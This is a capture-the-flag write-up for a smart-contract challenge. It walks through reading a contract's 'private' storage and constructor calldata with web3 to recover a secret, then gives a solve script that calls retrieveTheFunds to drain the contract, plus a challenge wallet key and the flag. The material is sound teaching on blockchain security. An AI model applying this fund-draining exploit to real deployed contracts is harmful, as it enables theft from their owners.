# Secret and Ephemeral [40 solves] [478 points]

### Description  
```  
Can you recover the lost secrets of this contract and take what is (not)
rightfully yours?

Goal: Steal all the funds from the contract.

Author: @bluealder  
```

This challenge is just about viewing private variables on the storage and
decoding the constructor arguments.

The objective is to call `retrieveTheFunds()` successfully and steal all the
funds.

### SecretAndEphemeral.sol :

```solidity  
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**  
* @title Secret And Ephemeral  
* @author Blue Alder (https://duc.tf)  
**/

contract SecretAndEphemeral {  
   address private owner;  
   int256 public seconds_in_a_year = 60 * 60 * 24 * 365;  
   string word_describing_ductf = "epic";  
   string private not_yours;  
   mapping(address => uint) public cool_wallet_addresses;

   bytes32 public spooky_hash; //

   constructor(string memory _not_yours, uint256 _secret_number) {  
       not_yours = _not_yours;  
       spooky_hash = keccak256(abi.encodePacked(not_yours, _secret_number, msg.sender));  
   }

   function giveTheFunds() payable public {  
       require(msg.value > 0.1 ether);  
       // Thankyou for your donation  
       cool_wallet_addresses[msg.sender] += msg.value;  
   }

   function retrieveTheFunds(string memory secret, uint256 secret_number,
address _owner_address) public {  
       bytes32 userHash = keccak256(abi.encodePacked(secret, secret_number, _owner_address));

       require(userHash == spooky_hash, "Somethings wrong :(");

       // User authenticated, sending funds  
       uint256 balance = address(this).balance;  
       payable(msg.sender).transfer(balance);  
   }  
}  
```

### How the challenge can be solved :

By viewing blocks,
`0xd3383dd590ea361847180c3616faed3a091c3e8f3296771e0c2844b2746d408f` is the
transaction that deployed the contract.

```python  
>>> web3.eth.get_block(4).transactions  
[HexBytes('0x222de1faca4e34b364871fecb8d5b6d7a281445f94d03fed07121063b3517b86'),
HexBytes('0xd3383dd590ea361847180c3616faed3a091c3e8f3296771e0c2844b2746d408f')]  
```

```python  
>>>
web3.eth.get_transaction('0xd3383dd590ea361847180c3616faed3a091c3e8f3296771e0c2844b2746d408f')  
AttributeDict({'blockHash':
HexBytes('0x218b9e52d18cdb230da0a0e91db24b12b93bd3c03d6ea6eb52cb545965b3e48d'),
'blockNumber': 4, 'from': '0x7BCF8A237e5d8900445C148FC2b119670807575b', 'gas':
391467, 'gasPrice': 1000000000, 'hash':
HexBytes('0xd3383dd590ea361847180c3616faed3a091c3e8f3296771e0c2844b2746d408f'),
'input':
'0x6301e1338060015560c060405260046080908152636570696360e01b60a05260029061002b908261013c565b5034801561003857600080fd5b506040516106fd3803806106fd833981016040819052610057916101fb565b6003610063838261013c565b506003813360405160200161007a939291906102ca565b60405160208183030381529060405280519060200120600581905550505061035a565b634e487b7160e01b600052604160045260246000fd5b600181811c908216806100c757607f821691505b6020821081036100e757634e487b7160e01b600052602260045260246000fd5b50919050565b601f82111561013757600081815260208120601f850160051c810160208610156101145750805b601f850160051c820191505b8181101561013357828155600101610120565b5050505b505050565b81516001600160401b038111156101555761015561009d565b6101698161016384546100b3565b846100ed565b602080601f83116001811461019e57600084156101865750858301515b600019600386901b1c1916600185901b178555610133565b600085815260208120601f198616915b828110156101cd578886015182559484019460019091019084016101ae565b50858210156101eb5787850151600019600388901b60f8161c191681555b5050505050600190811b01905550565b6000806040838503121561020e57600080fd5b82516001600160401b038082111561022557600080fd5b818501915085601f83011261023957600080fd5b81518181111561024b5761024b61009d565b604051601f8201601f19908116603f011681019083821181831017156102735761027361009d565b8160405282815260209350888484870101111561028f57600080fd5b600091505b828210156102b15784820184015181830185015290830190610294565b6000928101840192909252509401519395939450505050565b60008085546102d8816100b3565b600182811680156102f0576001811461030557610334565b60ff1984168752821515830287019450610334565b8960005260208060002060005b8581101561032b5781548a820152908401908201610312565b50505082870194505b50505094815260609390931b6001600160601b0319166020840152505060340192915050565b610394806103696000396000f3fe60806040526004361061004a5760003560e01c80631ac749ff1461004f57806323cfb56f146100775780637c46a9b014610081578063eb087bfb146100ae578063ecd424df146100c4575b600080fd5b34801561005b57600080fd5b5061006560015481565b60405190815260200160405180910390f35b61007f6100e4565b005b34801561008d57600080fd5b5061006561009c3660046101eb565b60046020526000908152604090205481565b3480156100ba57600080fd5b5061006560055481565b3480156100d057600080fd5b5061007f6100df366004610223565b61011e565b67016345785d8a000034116100f857600080fd5b33600090815260046020526040812080543492906101179084906102ee565b9091555050565b600083838360405160200161013593929190610315565b60405160208183030381529060405280519060200120905060055481146101985760405162461bcd60e51b81526020600482015260136024820152720a6dedacae8d0d2dccee640eee4dedcce40745606b1b604482015260640160405180910390fd5b6040514790339082156108fc029083906000818181858888f193505050501580156101c7573d6000803e3d6000fd5b505050505050565b80356001600160a01b03811681146101e657600080fd5b919050565b6000602082840312156101fd57600080fd5b610206826101cf565b9392505050565b634e487b7160e01b600052604160045260246000fd5b60008060006060848603121561023857600080fd5b833567ffffffffffffffff8082111561025057600080fd5b818601915086601f83011261026457600080fd5b8135818111156102765761027661020d565b604051601f8201601f19908116603f0116810190838211818310171561029e5761029e61020d565b816040528281528960208487010111156102b757600080fd5b826020860160208301376000602084830101528097505050505050602084013591506102e5604085016101cf565b90509250925092565b8082018082111561030f57634e487b7160e01b600052601160045260246000fd5b92915050565b6000845160005b81811015610336576020818801810151858301520161031c565b50919091019283525060601b6bffffffffffffffffffffffff1916602082015260340191905056fea2646970667358221220c558120b35ab560caa833f878d167e3c94af9005d6dea322262181580b0f895864736f6c634300081100330000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000dec0ded0000000000000000000000000000000000000000000000000000000000000022736f20616e79776179732069206a757374207374617274656420626c617374696e67000000000000000000000000000000000000000000000000000000000000',
'nonce': 1, 'to': None, 'transactionIndex': 1, 'value': 0, 'type': '0x0',
'chainId': '0x7a69', 'v': 62710, 'r':
HexBytes('0xcf50c8e0ed100baae3b31d69e45e7498caec66478e5ed9d884c3cedec6a14f82'),
's':
HexBytes('0x73ebe87f3541c26669adf9ef18e665f47f1a30796f8f4b7162795099807f7e5a')})  
```

So this is the msg.sender and will be the `_owner_address` that we need :

```python  
>>>
web3.eth.get_transaction('0xd3383dd590ea361847180c3616faed3a091c3e8f3296771e0c2844b2746d408f')['from']  
'0x7BCF8A237e5d8900445C148FC2b119670807575b'  
```

By viewing the storage, we can read the private string `not_yours` :  
```python  
>>>
web3.toText(web3.eth.getStorageAt('0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8',
web3.keccak(int(3).to_bytes(32, 'big')).hex()))  
'so anyways i just started blasti'

>>>
web3.toText(web3.eth.getStorageAt('0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8',
int(web3.keccak(int(3).to_bytes(32, 'big')).hex(), 16) + 1))  
'ng\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'  
```

Finally, for `secret_number`, we can just read the last part of the calldata
of the contract creation transcation, which will be the constructor arguments
:

```python  
>>>
web3.eth.get_transaction('0xd3383dd590ea361847180c3616faed3a091c3e8f3296771e0c2844b2746d408f')['input'][3400:]  
'91019283525060601b6bffffffffffffffffffffffff1916602082015260340191905056fea2646970667358221220c558120b35ab560caa833f878d167e3c94af9005d6dea322262181580b0f895864736f6c634300081100330000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000dec0ded0000000000000000000000000000000000000000000000000000000000000022736f20616e79776179732069206a757374207374617274656420626c617374696e67000000000000000000000000000000000000000000000000000000000000'  
```

```python  
>>> 0xdec0ded  
233573869  
```

It is `233573869` , then just call `retrieveTheFunds()` with them.

### Solve.py  
```python  
from web3 import Web3, HTTPProvider  
from web3.middleware import geth_poa_middleware

web3 = Web3(HTTPProvider('https://blockchain-
secretandephemeral-d642ff95f222c2d4-eth.2022.ductf.dev/'))  
web3.middleware_onion.inject(geth_poa_middleware, layer=0)

address = '0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8'  
abi =
'[{"inputs":[{"internalType":"string","name":"_not_yours","type":"string"},{"internalType":"uint256","name":"_secret_number","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"cool_wallet_addresses","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"giveTheFunds","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"string","name":"secret","type":"string"},{"internalType":"uint256","name":"secret_number","type":"uint256"},{"internalType":"address","name":"_owner_address","type":"address"}],"name":"retrieveTheFunds","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"seconds_in_a_year","outputs":[{"internalType":"int256","name":"","type":"int256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"spooky_hash","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"}]'  
contract_instance = web3.eth.contract(address=address, abi=abi)

wallet = '0x2880e3a5C6AE947b0802045DE08D5E3253286f61'  
private_key =
'0x15d6e7fa5f72f639c2cddf66d49d7c220e95834e855a89ccbcdbebe46909b4fc'

nonce = web3.eth.getTransactionCount(wallet)  
gasPrice = web3.toWei('4', 'gwei')  
gasLimit = 100000  
tx = {  
   'nonce': nonce,  
   'gas': gasLimit,  
   'gasPrice': gasPrice,  
   'from': wallet  
}  
transaction = contract_instance.functions.retrieveTheFunds('so anyways i just
started blasting', 233573869,
'0x7BCF8A237e5d8900445C148FC2b119670807575b').buildTransaction(tx)  
signed_tx = web3.eth.account.sign_transaction(transaction, private_key)  
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)  
transaction_hash = web3.toHex(tx_hash)  
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)  
print(tx_receipt['status'])  
```

### Flag :  
```json  
{"flag":"DUCTF{u_r_a_web3_t1me_7raveler_:)}"}  
```

Original writeup
(https://github.com/Kaiziron/downunderctf2022_writeup/blob/main/secretandephemeral.md).